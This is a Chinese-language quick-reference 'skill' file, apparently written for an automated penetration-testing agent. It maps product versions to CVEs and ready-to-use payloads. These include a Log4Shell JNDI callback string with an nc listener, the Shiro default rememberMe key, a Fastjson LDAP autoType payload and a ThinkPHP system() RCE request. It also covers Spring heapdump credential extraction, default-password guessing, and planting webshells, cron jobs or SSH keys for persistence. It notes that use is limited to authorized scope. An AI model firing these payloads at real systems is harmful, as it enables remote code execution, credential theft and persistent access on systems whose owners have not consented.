---
name: strike-quickref
description: 打击速查梯——worker 在指纹/版本已钉死后决定"打哪个 CVE、用什么字面 payload"时调用。版本→CVE→验证命令→现成 payload 的直查表（Log4j2/Shiro/Fastjson/ThinkPHP/Confluence/Spring/WebLogic/GitLab/中间件），配合本地 nuclei 模板验证。原则：先钉死版本→对照本表→nuclei 验证→再放 payload，不许凭印象放弹。
tags:
  cwe: [CWE-502, CWE-94, CWE-917]
  attack: [T1190]
  class: [cve-quickref, payload, fingerprint, nuclei]
---

# Strike Quickref（打击速查梯）

> 用法纪律：**指纹→版本→本表→nuclei 验证→payload**，顺序不许颠倒。
> 本表是"确认版本后的第一发"，不是"猜版本的扫射场"。

---

## 一、指纹→打法映射（中间件 RCE 速查）

| 指纹/版本 | CVE/打法 | nuclei tags | 字面 payload 起点 |
|---|---|---|---|
| Log4j2 ≤2.14 | Log4Shell | `log4j` | `${jndi:ldap://回连IP:1389/x}`，注入点走 X-Api-Version 等头/任意参数；本机 `nc -lvnp 1389` 收回连 |
| Shiro ≤1.5.1 | rememberMe 反序列化 | `shiro` | 默认老密钥 `kPH+bIxk5D2deZiIxcaaaA==`（不行换常见键表）；无 ysoserial 时改走 JNDI |
| Fastjson ≤1.2.47 | autoType RCE | `fastjson` | POST JSON：`{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://回连/x","autoCommit":true}` |
| ThinkPHP 5.x | invokefunction 路由 RCE | `thinkphp` | `s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=命令`（空格 URL 编码） |
| Confluence | CVE-2022-26134 OGNL | `confluence` | OGNL 模板注入公开 payload 直接套 |
| Spring Boot ≤2.3 | actuator 泄露 + Env/heapdump | `spring-boot` | `/actuator/env`、`/actuator/heapdump` 提凭据 |
| WebLogic | CVE-2019-2725/2888 | `weblogic` | _async 反序列化入口 |
| GitLab | CVE-2021-22205（exiftool） | `gitlab` | 未认证图片上传 RCE |
| JVM 系泛用 | JNDI 回连 | — | JNDI 注入工具起 LDAP/RMI 服务收回连 |

**流程**：钉死版本 → 上表对照 → `nuclei -u <目标> -tags <tag>`（本地模板已内置）→ 验证命中 → 放 payload → 回连/回显取证。

## 二、版本指纹方法论（打之前先钉死）

1. 三个独立来源交叉：响应头/报错页/静态资源指纹、`/actuator`、特定路径存在性；
2. 指纹写 fact 时带 `version_in_range` 语义（精确/区间/不确定）——不确定就先探，不猜；
3. 同产品多实例：**一个指纹结论只代表一个实例**，逐个钉。

## 三、nuclei 高效打法

- 优先 `-tags` 定向（上表第三列）而非全模板扫——快且日志少；
- severity 过滤：`-severity critical,high` 先行；
- 命中≠漏洞成立：nuclei 命中后仍需**人工验证证据**（本表流程第四步）才能报 finding；
- 批量资产：指纹分组后按组放 tag，不做无差别全扫。

## 四、高频补充面（非中间件）

- **git 泄露**：`.git/` 存在 → 工具恢复源码 → 找硬编码凭据/逻辑；
- **Spring 未授权**：`/actuator/heapdump` → MAT 提内存中的 Key/口令；
- **备份/源码压缩包**：`.zip/.tar.gz/.bak` + 常见名（www/backup/site）；
- **默认凭据面**：admin/admin、admin/123456 类 + 产品专属默认（登录面 ≤5 组失败即停，遵守最小伤害）；
- **vm2/JS 沙箱**：版本对应公开逃逸 payload 直查；
- **不出网 RCE**：回连不通时改写文件落地（webshell/计划任务/SSH key）取证。

## 五、纪律

- payload 只对**已授权范围**放；JNDI/回连地址用任务声明的出口；
- 每发 payload 前问：版本钉死了吗？nuclei 验证过了吗？**凭印象放弹是最大的浪费来源**；
- 本表没有的指纹 → 先 nuclei 全 tag 探一轮 → 再查漏洞情报库（search_vulns）→ 最后才手工摸索；
- 打成功的 payload **立即写成自包含 fact**（指纹+精确 payload+验证方式），供同族资产迁移。

---

> 出处：军团离线知识库的打击梯（kb050/052/053/055/056 等 56 条实战知识浓缩）。离线/弱网环境下本表与本地 nuclei 模板是仅有的 CVE 来源——先查表，再摸黑。
